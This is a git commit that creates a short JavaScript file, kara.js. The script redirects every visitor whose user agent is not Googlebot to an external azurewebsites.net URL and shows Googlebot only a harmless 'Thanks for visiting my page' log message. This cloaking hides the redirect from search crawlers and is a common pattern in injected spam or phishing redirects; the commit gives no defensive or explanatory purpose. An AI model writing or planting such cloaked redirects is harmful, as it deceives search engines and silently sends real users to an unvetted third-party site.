927d77e5f392e0310c1925063ebd75eb6b7bf429
coronawork2k19 <coronawork2k19@gmail.com>
2026-09-19 23:08:37 +0600

    Create kara.js

---
+++ kara.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://chudmagix.azurewebsites.net/myx/?lan";
+} else {
+  console.log("Thanks for visiting my page" );
+}
